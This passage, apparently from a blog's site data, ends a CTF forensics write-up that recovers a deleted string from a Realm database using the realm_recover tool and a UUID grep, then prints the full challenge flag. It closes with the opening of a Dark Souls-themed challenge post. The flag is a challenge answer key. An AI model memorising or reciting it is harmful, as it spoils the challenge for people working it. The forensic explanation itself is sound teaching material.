74\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 64\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 74\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">metadata........\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000050\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 17\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#79B8FF\">................\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000060\u003C/span>\u003Cspan style=\"color:#79B8FF\">  63\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6c\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 5f\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 52\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\">  61\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6c\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 54\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 74\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 43\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">class_RealmTestC\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000070\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  6c\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 0a\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">lass0...........\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000080\u003C/span>\u003Cspan style=\"color:#79B8FF\">  63\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6c\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 5f\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 52\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\">  61\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6c\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 6d\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 54\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 65\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 74\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 43\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">class_RealmTestC\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">00000090\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  6c\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 61\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 73\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 31\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\">  00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 0a\u003C/span>\u003Cspan style=\"color:#F97583\">  |\u003C/span>\u003Cspan style=\"color:#B392F0\">lass1...........\u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Key observations from the hex dump:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Bytes 0x10-0x13\u003C/strong>: \u003Ccode>54 2d 44 42\u003C/code> = “T-DB” - Realm database magic header\u003C/li>\n\u003Cli>\u003Cstrong>Bytes 0x14-0x17\u003C/strong>: \u003Ccode>41 41 41 41\u003C/code> = “AAAA” - Region marker for unused/free space\u003C/li>\n\u003Cli>\u003Cstrong>Offset 0x40\u003C/strong>: “metadata” string - Database metadata section\u003C/li>\n\u003Cli>\u003Cstrong>Offset 0x60\u003C/strong>: “class_RealmTestClass0” - First database schema class\u003C/li>\n\u003Cli>\u003Cstrong>Offset 0x80\u003C/strong>: “class_RealmTestClass1” - Second database schema class\u003C/li>\n\u003C/ul>\n\u003Cp>Before we can recover deleted data, we need to understand how Realm databases work:\u003C/p>\n\u003Ch4 id=\"realm-database-architecture\">Realm Database Architecture\u003C/h4>\n\u003Cp>Realm is a mobile-first database designed for iOS and Android applications. Unlike SQLite which uses SQL and table-based storage, Realm uses:\u003C/p>\n\u003Col>\n\u003Cli>\u003Cstrong>Object-based Model\u003C/strong>: Data is stored as objects, not rows and columns\u003C/li>\n\u003Cli>\u003Cstrong>Binary Format\u003C/strong>: Uses a custom binary format (not SQL)\u003C/li>\n\u003Cli>\u003Cstrong>MVCC (Multi-Version Concurrency Control)\u003C/strong>: Maintains multiple versions of data\u003C/li>\n\u003Cli>\u003Cstrong>Zero-Copy Architecture\u003C/strong>: Data is memory-mapped directly from disk\u003C/li>\n\u003C/ol>\n\u003Ch4 id=\"why-deleted-data-persists\">Why Deleted Data Persists\u003C/h4>\n\u003Cp>Realm uses MVCC, which means when you “delete” data, it doesn’t immediately erase it. Instead:\u003C/p>\n\u003Col>\n\u003Cli>The data is marked as deleted/unused\u003C/li>\n\u003Cli>A new version of the database state is created\u003C/li>\n\u003Cli>The old version’s data remains in unused space\u003C/li>\n\u003Cli>Garbage collection happens later (if at all)\u003C/li>\n\u003C/ol>\n\u003Cp>This creates a forensic opportunity: deleted records often remain in unused regions of the database file.\u003C/p>\n\u003Cp>To recover deleted data from the Realm database, we use \u003Ccode>realm_recover\u003C/code>, a specialized forensics tool designed specifically for analyzing Realm files. While exploring this approach, I came across prior research that discusses how deleted records in mobile application databases are often not immediately erased from disk. Instead, remnants of these records can persist within the database structure, making recovery possible through careful analysis. This idea is reinforced by both academic work and practical discussions from the developer and forensics communities, which describe how Realm’s internal storage format can retain deleted objects long enough for them to be reconstructed. These techniques are commonly applied in Android forensics, where understanding the database layout allows investigators to extract historical or deleted application data that would otherwise appear lost.\u003C/p>\n\u003Ch3 id=\"references\">References\u003C/h3>\n\u003Cul>\n\u003Cli>\n\u003Cp>Smart Techniques to Extract the Deleted Data From the Android Application\r\n\u003Ca href=\"https://www.sciencedirect.com/science/article/abs/pii/S2666281722000221\">https://www.sciencedirect.com/science/article/abs/pii/S2666281722000221\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Stack Overflow discussion on restoring deleted Realm objects\r\n\u003Ca href=\"https://stackoverflow.com/questions/52384845/how-to-restore-an-item-deleted-from-realm\">https://stackoverflow.com/questions/52384845/how-to-restore-an-item-deleted-from-realm\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Smart Techniques to Extract the Deleted Data From the Android Application (Academia.edu)\r\n\u003Ca href=\"https://www.academia.edu/77798036/Smart_Techniques_to_Extract_the_Deleted_Data_Form_the_Android_Application\">https://www.academia.edu/77798036/Smart_Techniques_to_Extract_the_Deleted_Data_Form_the_Android_Application\u003C/a>\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> cd\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /tmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> git\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> clone\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> https://github.com/hyuunnn/realm_recover.git\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Cloning\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> into\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'realm_recover'...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">remote:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Enumerating\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objects:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 84,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> done.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">remote:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Total\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 84\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (delta \u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), reused 0 (\u003C/span>\u003Cspan style=\"color:#B392F0\">delta\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), pack-reused 84\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Receiving\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objects:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 100%\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (84/84), 27.13 KiB \u003C/span>\u003Cspan style=\"color:#F97583\">|\u003C/span>\u003Cspan style=\"color:#B392F0\"> 1.51\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> MiB/s,\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> done.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Resolving\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> deltas:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 100%\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (42/42), done.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /tmp/realm_recover/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">LICENSE\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  objects.py\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  README.md\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  realm_recover.py\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  sample\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  util.py\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The tool consists of several components:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>realm_recover.py\u003C/strong>: Main recovery script\u003C/li>\n\u003Cli>\u003Cstrong>objects.py\u003C/strong>: Realm object parsing logic\u003C/li>\n\u003Cli>\u003Cstrong>util.py\u003C/strong>: Utility functions for binary analysis\u003C/li>\n\u003Cli>\u003Cstrong>sample/\u003C/strong>: Sample realm database for testing\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"running-the-realm-recovery-tool\">Running the Realm Recovery Tool\u003C/h3>\n\u003Cp>Execute the recovery tool on our decrypted realm database:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> python3\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /tmp/realm_recover/realm_recover.py\u003C/span>\u003Cspan style=\"color:#79B8FF\"> --file\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> decrypted.realm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[Tool runs silently, generating output files]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The tool doesn’t produce console output but generates several analysis files:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#79B8FF\"> *\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\">    1705\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 19:23\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> compare_objects.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1033382\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 19:23\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> data_storages.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1798075\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 19:23\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> scan_all_objects.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1117764\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 19:23\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> scan_unused_objects.txt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"understanding-the-output-files\">Understanding the Output Files\u003C/h4>\n\u003Col>\n\u003Cli>\n\u003Cp>\u003Cstrong>scan_all_objects.txt\u003C/strong> (1.8 MB):\u003C/p>\n\u003Cul>\n\u003Cli>Every object found in the database\u003C/li>\n\u003Cli>Includes both active and deleted objects\u003C/li>\n\u003Cli>Organized by offset and type\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>scan_unused_objects.txt\u003C/strong> (1.1 MB):\u003C/p>\n\u003Cul>\n\u003Cli>Objects not referenced by active tree roots\u003C/li>\n\u003Cli>These are \u003Cstrong>deleted/orphaned objects\u003C/strong>\u003C/li>\n\u003Cli>Primary target for forensic recovery\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>data_storages.txt\u003C/strong> (1.0 MB):\u003C/p>\n\u003Cul>\n\u003Cli>Raw data storage analysis\u003C/li>\n\u003Cli>Binary dumps of storage regions\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>compare_objects.txt\u003C/strong> (1.7 KB):\u003C/p>\n\u003Cul>\n\u003Cli>Comparison of TreeRootOffset01 vs TreeRootOffset02\u003C/li>\n\u003Cli>Shows what changed between versions\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ol>\n\u003Cp>The challenge description states the flag is in a “string which was modified and then deleted from the realm db”. This means we need to search \u003Ccode>scan_unused_objects.txt\u003C/code>.\u003C/p>\n\u003Cp>Search for UUID-pattern strings (the typical format for test data in Realm databases):\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -E\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"[0-9A-F]{8}-[0-9A-Z]{4}-[0-9A-Z]{4}-[0-9A-Z]{4}-[0-9A-Z]{12}\"\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> scan_unused_objects.txt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This grep pattern searches for:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>[0-9A-F]{8}\u003C/code>: 8 hex digits\u003C/li>\n\u003Cli>\u003Ccode>-\u003C/code>: Literal hyphen\u003C/li>\n\u003Cli>\u003Ccode>[0-9A-Z]{4}\u003C/code>: 4 alphanumeric characters (allowing non-hex)\u003C/li>\n\u003Cli>Pattern repeats: \u003Ccode>8-4-4-4-12\u003C/code> (UUID format)\u003C/li>\n\u003C/ul>\n\u003Cp>\u003Cstrong>Result\u003C/strong> (truncated for clarity):\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Offset: 0x800000, Type: 0x11, Count: 534043, Object: [\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  b'$97990266-4B4D-4306-A1EB-0FA8B4025844\\x06\\x04\\x02',\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  b'$48E1F6A5-C826-4244-B1CF-008E451606F3\\r\\x01\\x01\\x01',\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  b'$5P0BF5BC-5AA1-4790-A05F-A2RDCBALDB49\\x06\\x04\\x02\\x03',\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-10.png\" alt=\"Deleted Data\">\u003C/p>\n\u003Cp>Among hundreds of valid UUIDs, one stands out:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>5P0BF5BC-5AA1-4790-A05F-A2RDCBALDB49\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is \u003Cstrong>flagPart2\u003C/strong>.\u003C/p>\n\u003Cp>The \u003Ccode>realm_recover\u003C/code> tool is able to successfully retrieve deleted data because of how Realm manages its internal storage and object lifecycle. Realm relies on a Multi-Version Concurrency Control (MVCC) model, which means older versions of objects are preserved for consistency and concurrency purposes instead of being immediately removed. As a result, when an object is deleted, its previous version can still remain in memory or on disk for some time.\u003C/p>\n\u003Cp>In addition to this, \u003Ccode>realm_recover\u003C/code> scans regions of the database file that are no longer actively allocated, allowing it to identify data that is not referenced by the current database state but has not yet been overwritten. Because the tool understands Realm’s binary object layout, it can correctly parse these leftover structures and reconstruct meaningful records from raw bytes. In this case, the deleted UUID was found at offset \u003Ccode>0x800000\u003C/code> within a region marked as unused. Although the object was no longer linked from the active database tree, its binary representation was still fully intact in the file, and the absence of garbage collection or overwrite made recovery possible.\u003C/p>\n\u003Cp>\u003Cstrong>Complete Flag:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>bi0sctf{w311_7h47_p4r7_w45_345y_5P0BF5BC-5AA1-4790-A05F-A2RDCBALDB49}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"references-and-further-reading\">References and Further Reading\u003C/h2>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://github.com/worawit/blutter\">Blutter - Flutter Reverse Engineering Tool\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://github.com/hyuunnn/realm_recover\">realm_recover - Realm Database Forensics\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://www.mongodb.com/docs/realm/\">Realm Database Documentation\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://arxiv.org/abs/2108.12419\">Flutter Forensics Research\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://source.android.com/docs/core/storage\">Android Data Partition Structure\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://dl.acm.org/doi/10.1145/3183713.3183754\">MVCC in Mobile Databases\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://koreascience.or.kr/article/JAKO201820765436681.page\">Realm 데이터베이스의 삭제된 레코드 복구 기법\u003C/a>\u003C/li>\n\u003C/ul>",{"headings":549,"localImagePaths":622,"remoteImagePaths":623,"frontmatter":624,"imagePaths":625},[550,553,556,559,562,565,568,571,574,577,580,583,586,589,592,595,598,601,604,607,610,613,616,619],{"depth":24,"slug":551,"text":552},"onapookkalam-challenge-writeup","Onapookkalam Challenge Writeup",{"depth":27,"slug":554,"text":555},"challenge-overview","Challenge Overview",{"depth":27,"slug":557,"text":558},"investigation-process","Investigation Process",{"depth":40,"slug":560,"text":561},"initial-file-extraction","Initial File Extraction",{"depth":40,"slug":563,"text":564},"notes-recovery","Notes Recovery",{"depth":40,"slug":566,"text":567},"flutter-app-analysis","Flutter App Analysis",{"depth":40,"slug":569,"text":570},"source-code-discovery","Source Code Discovery",{"depth":40,"slug":572,"text":573},"encryption-implementation","Encryption Implementation",{"depth":40,"slug":575,"text":576},"examining-the-output-structure","Examining the Output Structure",{"depth":40,"slug":578,"text":579},"locating-the-main-application-code","Locating the Main Application Code",{"depth":40,"slug":581,"text":582},"extracting-the-encryption-keys","Extracting the Encryption Keys",{"depth":260,"slug":584,"text":585},"step-4-decryption-and-base64-decode","Step 4: Decryption and Base64 Decode",{"depth":27,"slug":587,"text":588},"part-6-implementing-the-decryptor","Part 6: Implementing the Decryptor",{"depth":40,"slug":590,"text":591},"downloading-the-encrypted-file","Downloading the Encrypted File",{"depth":40,"slug":593,"text":594},"creating-cargotoml-for-rust-dependencies","Creating Cargo.toml for Rust Dependencies",{"depth":40,"slug":596,"text":597},"running-the-rust-decryptor","Running the Rust Decryptor",{"depth":40,"slug":599,"text":600},"verifying-the-decrypted-file","Verifying the Decrypted File",{"depth":40,"slug":602,"text":603},"why-the-key-is-reversed","Why the Key is Reversed",{"depth":260,"slug":605,"text":606},"realm-database-architecture","Realm Database Architecture",{"depth":260,"slug":608,"text":609},"why-deleted-data-persists","Why Deleted Data Persists",{"depth":40,"slug":611,"text":612},"references","References",{"depth":40,"slug":614,"text":615},"running-the-realm-recovery-tool","Running the Realm Recovery Tool",{"depth":260,"slug":617,"text":618},"understanding-the-output-files","Understanding the Output Files",{"depth":27,"slug":620,"text":621},"references-and-further-reading","References and Further Reading",[],[],{"title":541,"date":147},[],"havok-engine-reverse-engineering",{"id":626,"data":628,"body":632,"filePath":633,"digest":634,"rendered":635},{"title":629,"date":630,"excerpt":631},"Reverse Engineering Proprietary Havoc Engine File Formats",["Date","2024-12-29T00:00:00.000Z"],"Multi-part CTF challenge involving Dark Souls map modding, Rust binary exploitation, and nested steganography. Covers FromSoftware file formats, dnSpy patching, ELF header repair, and advanced image forensics.","![Challenge Header](/images/posts/havok-engine-reverse-engineering/header.png)\r\n\r\n**Category:** Forensics / Reverse Engineering  \r\n**Difficulty:** Hard  \r\n**Points:** 500  \r\n**Author:** muffin  \r\n\r\n**Download:** [Challenge Files](https://drive.google.com/file/d/1et9zmI8x2CGYnwP1DhD0sfCOJWerGwfV/view?usp=drive_link)\r\n\r\n---\r\n\r\n## Description\r\n\r\nShe is not of Lordran’s timelines, nor any world scholars recall.\r\nAn unbound Firekeeper  caught between files that refuse to load and geometry that rejects her shape,\r\nas if she were written into existence and erased in the same breath.\r\n\r\nOnly fragments of her remain, scattered through the wreckage of an unfinished realm:\r\n\r\nThose who examined the fragments recall a single whisper threaded through all anomalies:\r\n\r\n**“To restore her, trace the fragments.\r\nAll three converge where the last bonfire never burned.”**\r\n\r\n\r\n\r\n## **Ashen Shard**\r\n\r\nA brittle sliver from a world that failed to load.\r\nA silhouette flickers within it, suspended between one form and the next.\r\nIt remembers where she once stood, though the 